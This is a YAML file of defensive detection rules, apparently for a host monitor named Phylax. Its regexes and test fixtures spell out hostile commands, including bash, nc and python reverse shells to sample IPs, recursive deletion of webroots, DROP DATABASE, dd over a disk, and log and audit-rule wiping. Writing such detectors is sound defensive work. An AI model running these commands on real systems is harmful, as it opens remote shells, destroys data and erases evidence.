id: D17c.service-stop
title: Stop, disable, mask or kill of a scored service
severity: medium
tier: 1
attack: [T1489, T1685]
collect: [process_tree]
exempt_tagged: true
when:
  event: process_start
  all:
    - comm: [systemctl, service, kill, killall, pkill]
    - cmdline: {re: '(?i)(stop|disable|mask|unmask|kill|-9)\s.*(\b(apache2|httpd|nginx|php[0-9.]*-fpm|postfix|dovecot|mysql(d)?|mariadb(d)?|named|bind9|vsftpd|proftpd|smb(d)?|splunk(d)?|wazuh-agent|auditd|rsyslog)\b|\bsshd?(\.service)?(\s|$))'}
tests:
  - {name: stop apache, should_match: true, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl stop apache2"}}}
  - {name: mask sshd, should_match: true, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl mask sshd.service"}}}
  - {name: status is a read, should_match: false, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl status apache2"}}}
  - {name: plan restart is tagged, should_match: false, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl stop nginx", tag: "plan:p3"}}}
---
id: D17d.destructive-cmd
title: Bulk delete, wipe or destructive SQL from a shell
severity: high
tier: 1
attack: [T1485, T1561, T1490]
collect: [process_tree, content_changes]
exempt_tagged: true
when:
  event: process_start
  any:
    - all:
        - comm: [rm, shred, unlink, wipe]
        - cmdline: {re: '(-[a-zA-Z]*[rR]|--recursive|--no-preserve-root).*(/var/www|/srv|/etc/(postfix|dovecot|bind|mysql)|/var/lib/(mysql|pgsql|postgresql))'}
    - all:
        - comm: [mysql, mariadb, psql, mysqladmin]
        - cmdline: {re: '(?i)(drop\s+(database|table|schema)|truncate\s+table|delete\s+from\s+\S*(user|product|order|customer|admin|employee))'}
    - all:
        - comm: [dd, truncate]
        - cmdline: {re: '(of=/dev/(sd|nvme|vd|xvd)|--size[= ]0|-s ?0\s)'}
tests:
  - {name: rm -rf webroot, should_match: true, event: {kind: process_start, fields: {comm: rm, cmdline: "rm -rf /var/www/html"}}}
  - {name: drop database, should_match: true, event: {kind: process_start, fields: {comm: mysql, cmdline: "mysql -e DROP DATABASE shop"}}}
  - {name: dd to disk, should_match: true, event: {kind: process_start, fields: {comm: dd, cmdline: "dd if=/dev/zero of=/dev/sda"}}}
  - {name: rm tmp, should_match: false, event: {kind: process_start, fields: {comm: rm, cmdline: "rm -rf /tmp/build"}}}
---
id: D10k.fw-exec-tamper
title: Linux host firewall flushed, disabled or default policy changed by command
severity: high
tier: 1
attack: [T1686]
collect: [process_tree, content_changes]
exempt_tagged: true
when:
  event: process_start
  all:
    - comm: [iptables, ip6tables, nft, ufw, firewall-cmd, iptables-save, iptables-restore]
    - cmdline: {re: '(\s-F(\s|$)|--flush|flush\s+ruleset|\sdisable(\s|$)|--panic-on|-P\s+(INPUT|OUTPUT|FORWARD)\s+(ACCEPT|DROP|REJECT)|-I\s+INPUT.*-j\s+(DROP|REJECT)|delete\s+(rule|table|chain))'}
tests:
  - {name: iptables -F, should_match: true, event: {kind: process_start, fields: {comm: iptables, cmdline: "iptables -F"}}}
  - {name: ufw disable, should_match: true, event: {kind: process_start, fields: {comm: ufw, cmdline: "ufw disable"}}}
  - {name: our restore is tagged, should_match: false, event: {kind: process_start, fields: {comm: iptables, cmdline: "iptables -F", tag: "restore:firewall"}}}
  - {name: listing rules, should_match: false, event: {kind: process_start, fields: {comm: iptables, cmdline: "iptables -L -n"}}}
---
id: D5e3.kthread-masquerade
title: User-space process pretending to be a kernel thread
severity: high
tier: 1
attack: [T1036.004, T1014]
collect: [process_tree]
when:
  event: process_start
  all:
    - cmdline: {re: '^\[(kworker|kthreadd|ksoftirqd|migration|rcu_[a-z]+|watchdog|kswapd)[^\]]*\]'}
    - image: {present: true}
tests:
  - {name: fake kworker, should_match: true, event: {kind: process_start, fields: {cmdline: "[kworker/0:1]", image: /tmp/.x/miner}}}
  - {name: normal process, should_match: false, event: {kind: process_start, fields: {cmdline: "/usr/sbin/sshd -D", image: /usr/sbin/sshd}}}
---
id: D13b2.revshell-cmd
title: Reverse-shell command shape
severity: critical
tier: 1
attack: [T1059.004, T1095, T1571]
collect: [process_tree, freeze_ring]
exempt_tagged: true
when:
  event: process_start
  any:
    - all:
        - comm: [bash, sh, dash, zsh]
        - cmdline: {re: '(-i\s*>&?\s*/dev/(tcp|udp)/|/dev/(tcp|udp)/[0-9.]+/[0-9]+|exec\s+[0-9]+<>/dev/tcp)'}
    - all:
        - comm: [nc, ncat, netcat, socat]
        - cmdline: {re: '(\s-[a-z]*[ec]\s+/bin/(ba)?sh|\sexec:|\sEXEC:|\ssystem:)'}
    - all:
        - comm: {re: '^(python[0-9.]*|perl|ruby|php)$'}
        - cmdline: {re: '(?i)(socket.*(connect|SOCK_STREAM).*(sh|pty|dup2)|pty\.spawn|fsockopen.*(sh|exec)|TCPSocket.*(sh|exec))'}
tests:
  - {name: bash /dev/tcp, should_match: true, event: {kind: process_start, fields: {comm: bash, cmdline: "bash -i >& /dev/tcp/10.1.1.1/4444 0>&1"}}}
  - {name: nc -e, should_match: true, event: {kind: process_start, fields: {comm: nc, cmdline: "nc -e /bin/sh 10.1.1.1 4444"}}}
  - {name: python pty.spawn, should_match: true, event: {kind: process_start, fields: {comm: python3, cmdline: "python3 -c import socket,pty;s=socket.socket();s.connect(('1.1.1.1',1));pty.spawn('sh')"}}}
  - {name: plain bash script, should_match: false, event: {kind: process_start, fields: {comm: bash, cmdline: "bash /usr/local/bin/backup.sh"}}}
---
id: D10g.log-clear-exec
title: Command that clears logs, shell history or audit rules
severity: high
tier: 1
attack: [T1685.006, T1070.003, T1070.004, T1685]
collect: [process_tree, content_changes]
exempt_tagged: true
when:
  event: process_start
  any:
    - all:
        - comm: [truncate, shred, rm, unlink, cp, mv]
        - cmdline: {re: '/var/log/(auth\.log|secure|syslog|messages|wtmp|btmp|lastlog|audit/audit\.log|kern\.log|apache2|httpd|nginx|mail\.log|maillog|journal)'}
    - all:
        - comm: journalctl
        - cmdline: {re: '--(vacuum-(time|size|files)|rotate)'}
    - all:
        - comm: [history, bash, sh, ln, export, unset]
        - cmdline: {re: '(history\s+-[cw]|unset\s+HISTFILE|HISTFILE=/dev/null|HISTSIZE=0|ln\s+-s[f]?\s+/dev/null\s+\S*history)'}
    - all:
        - comm: auditctl
        - cmdline: {re: '(\s-D(\s|$)|\s-e\s*0)'}
tests:
  - {name: truncate auth.log, should_match: true, event: {kind: process_start, fields: {comm: truncate, cmdline: "truncate -s 0 /var/log/auth.log"}}}
  - {name: auditctl -D, should_match: true, event: {kind: process_start, fields: {comm: auditctl, cmdline: "auditctl -D"}}}
  - {name: auditctl -D by our plan, should_match: false, event: {kind: process_start, fields: {comm: auditctl, cmdline: "auditctl -D", tag: "plan:audit-reload"}}}
  - {name: auditctl -l, should_match: false, event: {kind: process_start, fields: {comm: auditctl, cmdline: "auditctl -l"}}}
---
id: D10j.timestomp
title: touch used to set explicit timestamps
severity: low
tier: 1
attack: [T1070.006]
collect: [process_tree]
exempt_tagged: true
when:
  event: process_start
  all:
    - comm: touch
    - cmdline: {re: '(^|\s)(-[a-zA-Z]*[tdr]\b|--(date|reference)[ =])'}
tests:
  - {name: touch -r, should_match: true, event: {kind: process_start, fields: {comm: touch, cmdline: "touch -r /bin/ls /tmp/x.php"}}}
  - {name: plain touch, should_match: false, event: {kind: process_start, fields: {comm: touch, cmdline: "touch /tmp/x"}}}
---
id: D10h.monitor-stop
title: Stop, disable or kill of a monitoring, logging or Phylax service
severity: high
tier: 1
attack: [T1685, T1489]
collect: [process_tree]
exempt_tagged: true
when:
  event: process_start
  all:
    - comm: [systemctl, service, kill, killall, pkill, sc.exe, net.exe, net1.exe, taskkill.exe]
    - cmdline: {re: '(?i)(stop|disable|mask|kill|-9|-15|delete|/f)\b.*\b(auditd|rsyslog(d)?|syslog-ng|journald|wazuh(-agent)?|ossec|splunk(d|forwarder)?|falco|osqueryd|sysmon(64)?|phylax|WinDefend|MpsSvc|EventLog|Sense)\b'}
tests:
  - {name: stop auditd, should_match: true, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl stop auditd"}}}
  - {name: sc stop sysmon, should_match: true, event: {kind: process_start, fields: {comm: sc.exe, cmdline: "sc.exe stop Sysmon64"}}}
  - {name: restart is not stop, should_match: false, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl status auditd"}}}
---
id: D5a.memfd-or-deleted-exec
title: Process executed from memfd or a deleted file
severity: high
tier: 1
attack: [T1620, T1055]
collect: [process_tree, memory_artifacts]
when:
  event: process_start
  all:
    - image: {re: '^/memfd:|\(deleted\)$'}
tests:
  - {name: memfd exec, should_match: true, event: {kind: process_start, fields: {image: "/memfd:x (deleted)", comm: x}}}
  - {name: normal binary, should_match: false, event: {kind: process_start, fields: {image: /usr/bin/ls}}}
